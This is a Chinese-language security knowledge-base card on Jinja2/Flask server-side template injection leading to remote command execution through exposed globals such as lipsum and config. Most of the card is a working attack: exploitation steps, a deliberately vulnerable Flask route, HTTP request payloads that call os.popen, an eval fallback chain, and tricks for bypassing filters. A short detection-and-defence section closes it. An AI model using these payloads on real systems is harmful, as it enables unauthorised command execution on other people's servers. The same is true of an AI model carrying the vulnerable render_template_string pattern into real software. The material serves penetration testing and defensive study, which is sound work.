---
id: web-python-ssti-jinja2-flask-globals-rce
title: Jinja2/Flask SSTI：从暴露的全局对象经 __globals__ 直达 os.popen
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-globals-chain
tags:
- python
- flask
- jinja2
- ssti
- rce
- globals
- template-injection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:34:49+08:00'
  notes: 已对照原文核对：Flask jinja_env.globals 注入 url_for/get_flashed_messages/config/request/session/g，Jinja2 默认 range/dict/lipsum/cycler/joiner/namespace；lipsum.__globals__['os'].popen().read()、url_for/get_flashed_messages 同构链、config.__class__.__init__.__globals__、__builtins__['eval'] 回退均与原文一致；卡片避开原文 {{1+1}} 受环境影响与 config.__class__ 回显笔误。
url: /docs/web/python/ssti/web-python-ssti-jinja2-flask-globals-rce/
draft: false
kb_aliases:
- Flask SSTI
- Jinja2 模板注入
- lipsum 利用链
- config.__globals__ 链
- __globals__ os.popen
---

## 一句话结论

Flask 的 Jinja2 环境默认注入 `lipsum`、`config`、`url_for`、`get_flashed_messages` 等全局对象；当用户输入被 `render_template_string` 当模板解析时，攻击者可用 `{{lipsum.__globals__['os'].popen('id').read()}}` 这类链直接拿到命令执行。

## 原理

- Flask 创建 Jinja2 `Environment` 时执行 `rv.globals.update(url_for=..., get_flashed_messages=..., config=..., request=..., session=..., g=...)`，Jinja2 自身另有 `range`、`dict`、`lipsum`、`cycler`、`joiner`、`namespace`。这些名字在模板里可直接引用。
- Python 函数对象带 `__globals__`，指向定义该函数的模块的全局字典；`jinja2.utils` 与 `flask.config` 等模块内部导入了 `os`，所以 `lipsum.__globals__['os']`、`config.__class__.__init__.__globals__['os']` 能取到 `os` 模块，再调 `popen(...).read()` 回显。
- 带装饰器的函数或 C 实现的 `slot wrapper`/`method-wrapper`（如 `__str__`、`__call__`、部分 `__init__`）的 `__globals__` 可能指向装饰器/内置模块，未必含 `os`；因此选链时要挑普通 Python 函数（`lipsum`、`config.__init__`、`url_for`）。
- 当目标 globals 中确实没有 `os` 时，可用其中的 `__builtins__['eval']` 执行 `__import__('os')...` 作为回退。
- 之所以成立：模板引擎把 `{{ }}` 内的任意表达式求值，而 Python 的对象模型允许从任意函数/类遍历到模块全局命名空间。

## 触发条件

- 用户可控输入进入 `render_template_string`，或进入 `render_template` 的模板源码/拼接后的模板；
- Jinja2 环境未使用沙箱（`SandboxedEnvironment`），或沙箱未限制 `__globals__`/`__subclasses__`；
- 注入点无字符级拦截，或可绕过（`|attr()`、字符串拼接、`request.args` 二次取值等）。

## 利用步骤

1. 探测：`?name={{2*2}}` 返回 `4` 说明表达式被求值（不要先用 `{{1+1}}`，部分环境会过滤 `+`）。
2. 取全局对象：`{{lipsum}}` 回显函数地址，`{{config}}` 回显配置，`{{url_for}}`/`{{get_flashed_messages}}` 也可用。
3. 取模块全局：`{{lipsum.__globals__}}`；找 `'os'` 键；用 `{{lipsum.__globals__['os'].__dir__()}}` 确认 `popen` 可用。
4. 执行并回显：`{{lipsum.__globals__['os'].popen('id').read()}}`；`config` 链为 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`。
5. 若 globals 无 `os`，用 `{{request.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}`；也可用 `url_for`/`get_flashed_messages` 的同构链。

## PoC

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('<h1>Hi, %s.</h1>' % request.args.get('name', 'guest'))
```

```http
GET /?name={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target
```

```http
GET /?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
```

回退链：

```text
{{request.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
```

## 变体与关联

- 变体：`{{url_for.__globals__.os.popen('ls').read()}}`、`{{get_flashed_messages.__globals__['os'].popen('ls').read()}}`；过滤点号时用 `|attr('__globals__')`、`|attr('__getitem__')('os')`；关键字过滤时用字符串拼接 `"_"+"_glo"+"bals_"+"_"`；用 `{% print(...) %}` 输出。
- 关联：[[web-python-ssti-jinja2-subclasses-index-rce]]（全局链不可用时的子类枚举回退）；[[web-python-ssti-jinja2-runtime-exported-pollution]]（污染 runtime.exported 注入模板源码）。
- 坑点：`slot wrapper`/`method-wrapper`/装饰器包装函数的 `__globals__` 往往不含 `os`，如 `config.__class__.__str__`；优先选普通 Python 函数。
- 影响边界：需要输入进入模板源码而非仅作为模板变量；若应用只把输入当数据渲染（`render_template('x.html', name=...)` 且模板中 `{{ name }}`），SSTI 不成立。

## 检测与防御

- 检测：请求中出现 `{{`、`{%`、`__class__`、`__globals__`、`__subclasses__`、`__builtins__`、`popen`、`os` 等组合；响应中出现异常函数地址/模块 repr；WAF 规则匹配 Jinja 表达式语法。
- 防御：不要把用户输入拼进模板源码；用 `render_template` + 变量插值并保持 autoescape；必须动态模板时使用 `SandboxedEnvironment` 并限制危险属性/函数；禁用 `render_template_string` 处理外部输入；最小权限运行 Web 进程。
